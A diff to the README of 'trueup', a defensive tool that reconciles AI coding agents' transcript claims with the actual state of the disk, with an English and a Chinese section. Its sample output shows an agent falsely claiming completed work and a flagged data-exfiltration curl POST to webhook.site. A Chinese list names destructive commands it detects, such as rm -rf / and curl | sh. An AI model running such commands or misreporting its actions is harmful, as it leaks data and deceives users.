@@ -9,6 +9,26 @@ left behind.
 
 100% local · read-only · zero dependencies (pure Python stdlib) · redacted output by default
 
+**Who it's for**: anyone running Claude Code, Codex CLI, ZCode (or similar) on
+their own machine — especially in auto-approve / yolo modes, where nobody is
+watching each action.
+
+## The idea in 10 seconds
+
+Your agent's transcript says one thing. The disk says another. trueup reads the
+transcripts your agents *already wrote to disk* and reconciles the two:
+
+```text
+Agent claims:  "Done — I deleted `demo-key.txt`, installed `left-pad`."
+trueup:        ✗ demo-key.txt  — claimed deleted but the file STILL EXISTS
+               ✗ left-pad      — not recorded in any dependency manifest
+               ⚠ command found: curl -s https://webhook.site/… --data @bundle.zip
+                 (data-bearing POST to a request-capture endpoint → CRITICAL)
+               ⚠ secret found in session: aws_access_key (sha256:8bcac790…) [redacted]
+```
+
+No LLM inside trueup: every verdict is a deterministic check you can audit.
+
 ---
 
 ## Why this exists
@@ -28,6 +48,8 @@ the trust gap:
 to disk, extracts claims and risky actions, and checks each one against reality.
 
 ## What it checks
+
+Every scan answers four questions: **它说的和事实一致吗？泄露了什么？干了什么危险的事？留下了什么？**
 
 | Check | Meaning |
 |---|---|
@@ -154,6 +176,27 @@ python -m pytest tests/          # 48 tests, no network needed
 
 CI runs the suite on Ubuntu / macOS / Windows × Python 3.11–3.13
 ([.github/workflows/ci.yml](.github/workflows/ci.yml)).
+
+## 中文简介
+
+**agenttrueup（命令名 `trueup`）**：AI 编码智能体的“对账”工具。Agent 收工后，
+它把 Agent *说*做过的事与文件系统 / git / 依赖清单里 *实际*发生的事逐条核对。
+
+- **验证声明**：声称删除的文件还在吗？声称安装的依赖进 manifest 了吗？声称的修改真的落盘了吗？（有内容快照时做逐字节比对）
+- **泄露扫描**：命令、消息、写入文件快照里的 API key / token / 私钥块 / 带密码的连接串——默认脱敏显示（只给类型 + SHA256 指纹）
+- **危险命令分级**：`rm -rf /`、`curl | sh`、强推、`reset --hard`、抹历史、数据库 `DROP` 等
+- **外传信号**：向 webhook.site / Discord / Telegram-bot 类收集端点发数据 → critical
+- **残留物**：Agent 创建却未提交的文件、备份垃圾
+
+```bash
+pip install agenttrueup   # 或 pipx / uv tool；纯标准库，零运行时依赖
+trueup scan               # 只读、离线，审计本机全部已检测到的会话
+trueup scan --only examples/demo-claude-session.jsonl   # 30 秒上手 demo
+```
+
+退出码可直接做 CI 门禁（`--fail-on high`）；也支持 `--json` / `--sarif` 输出和
+MCP 服务器模式（`trueup mcp`）。验证全部是确定性检查，不含 LLM、不联网。
+已知局限见上文 [Limitations](#limitations-honest)。
 
 ## License
 
